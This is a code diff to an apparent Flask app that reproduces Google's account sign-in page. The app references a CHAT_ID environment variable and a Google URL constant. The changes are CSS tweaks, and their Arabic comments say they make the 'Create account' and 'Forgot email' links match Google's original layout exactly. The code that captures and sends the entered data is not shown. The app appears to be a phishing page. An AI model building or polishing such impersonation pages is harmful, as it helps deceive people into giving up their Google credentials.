@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: فصل حاوية "إنشاء حساب" بمسافة واضحة عن رابط "هل نسيت بريدك الإلكتروني"
+# الصفحة الأولى: تعديل التوزيع لتكون كلمة "إنشاء حساب" في مكانها الطبيعي تماماً مثل جوجل
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -64,6 +64,7 @@ def step1():
             flex-direction: column;
             align-items: center;
             text-align: center;
+            flex: 1;
         }
 
         .google-g {
@@ -113,6 +114,8 @@ def step1():
             text-align: right;
             display: flex;
             flex-direction: column;
+            /* ضبط المسافة المتبقية لتوزيع الروابط بشكل مثالي ومتطابق مع التصميم الأصلي */
+            justify-content: flex-start;
         }
 
         .input-group { 
@@ -137,13 +140,13 @@ def step1():
             text-decoration: none;
             font-weight: 500;
             display: inline-block;
+            margin-bottom: 28px; /* مسافة مدروسة بين هل نسيت بريدك وإنشاء حساب */
         }
         .forgot-link:hover { text-decoration: underline; }
 
         .signup-container {
             width: 100%;
             text-align: right;
-            margin-top: 24px; /* فصل حاوية إنشاء حساب بمسافة واضحة ومستقلة تماماً عن رابط هل نسيت البريد */
         }
 
         .signup-link {
